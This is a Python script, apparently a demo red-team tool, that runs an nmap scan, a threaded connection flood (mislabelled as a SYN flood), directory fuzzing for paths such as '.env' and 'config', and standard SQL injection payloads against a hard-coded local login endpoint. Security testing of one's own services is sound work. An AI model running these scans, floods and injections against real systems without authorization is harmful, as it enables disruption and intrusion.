import sys
import time
import socket
import random
import threading
import requests
import nmap
from datetime import datetime

# Colors
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8005

def print_banner():
    print(Colors.FAIL + Colors.BOLD + """
    ╔════════════════════════════════════════════╗
    ║       SHIELD RED TEAM CLI - v2.0           ║
    ║       Live Security Auditing Tool          ║
    ╚════════════════════════════════════════════╝
    """ + Colors.ENDC)

def scan_ports(target):
    print(Colors.BLUE + f"[*] Starting Nmap Scan on {target}..." + Colors.ENDC)
    nm = nmap.PortScanner()
    try:
        # Perform a fast scan on common ports
        nm.scan(target, '21-8080', arguments='-T4 --max-retries 1')
        for host in nm.all_hosts():
            print(Colors.BLUE + f"Host: {host} ({nm[host].hostname()})" + Colors.ENDC)
            for proto in nm[host].all_protocols():
                print(Colors.BLUE + f"Protocol: {proto}" + Colors.ENDC)
                lport = nm[host][proto].keys()
                for port in sorted(lport):
                    state = nm[host][proto][port]['state']
                    if state == 'open':
                        print(Colors.GREEN + f"    [+] Port {port} OPEN" + Colors.ENDC)
    except Exception as e:
        print(Colors.FAIL + f"[-] Nmap scan failed: {e}" + Colors.ENDC)

def simulate_attack(type_name, count=100):
    print(Colors.WARNING + f"[*] Launching {type_name} Attack..." + Colors.ENDC)
    
    def flood():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            time.sleep(random.uniform(0.1, 2.0))
            s.close()
        except:
            pass

    threads = []
    print(f"    Sending {count} packets/requests...")
    for _ in range(count):
        t = threading.Thread(target=flood)
        t.start()
        threads.append(t)
        time.sleep(0.01)
        
    for t in threads:
        t.join()
        
    print(Colors.GREEN + "[+] Attack Complete." + Colors.ENDC)

def fuzz_endpoints():
    print(Colors.BLUE + "[*] Fuzzing endpoints..." + Colors.ENDC)
    wordlist = ["admin", "login", "api", "test", "backup", "db", "config", "hidden", ".env", "metrics"]
    base_url = f"http://{TARGET_IP}:{TARGET_PORT}/"
    for word in wordlist:
        try:
            url = base_url + word
            r = requests.get(url, timeout=1)
            if r.status_code != 404:
                print(Colors.GREEN + f"    [+] Found endpoint: {url} (Status: {r.status_code})" + Colors.ENDC)
            else:
                print(f"    [-] Not found: {url}")
        except requests.RequestException:
            pass
    print(Colors.GREEN + "[+] Fuzzing Complete." + Colors.ENDC)

def execute_sqli():
    print(Colors.WARNING + "[*] Launching SQL Injection Payloads..." + Colors.ENDC)
    payloads = ["' OR 1=1 --", "admin' --", "UNION SELECT 1,2,3--", "' OR '1'='1"]
    
    base_url = f"http://{TARGET_IP}:{TARGET_PORT}/api/login"
    for payload in payloads:
        try:
            r = requests.get(base_url, params={"user": payload}, timeout=1)
            print(Colors.GREEN + f"    [+] Injected payload: {payload} -> HTTP {r.status_code}" + Colors.ENDC)
            time.sleep(0.1)
        except requests.RequestException:
            pass
    print(Colors.GREEN + "[+] SQLi Test Complete." + Colors.ENDC)

def main():
    print_banner()
    while True:
        print("\n" + Colors.HEADER + "SELECT MODULE:" + Colors.ENDC)
        print("1. 🔍 Recon: Nmap Port Scanner")
        print("2. 💥 Attack: SYN Flood (Stress Test)")
        print("3. 🕷️ Web: Fuzzing / Directory Brute")
        print("4. 💉 Web: SQL Injection Payloads")
        print("5. 🚪 Exit")
        
        choice = input("\nshield-cli > ")
        
        if choice == '1':
            scan_ports(TARGET_IP)
        elif choice == '2':
            simulate_attack("SYN Flood", count=50)
        elif choice == '3':
            fuzz_endpoints()
        elif choice == '4':
            execute_sqli()
        elif choice == '5':
            sys.exit(0)
        else:
            print("Invalid command.")

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "--auto":
        print_banner()
        print(Colors.WARNING + "[!] AUTO-MODE ENGAGED" + Colors.ENDC)
        scan_ports(TARGET_IP)
        simulate_attack("SYN Flood", count=50)
        fuzz_endpoints()
        execute_sqli()
        print(Colors.GREEN + "[+] Auto-Test Complete." + Colors.ENDC)
    else:
        main()
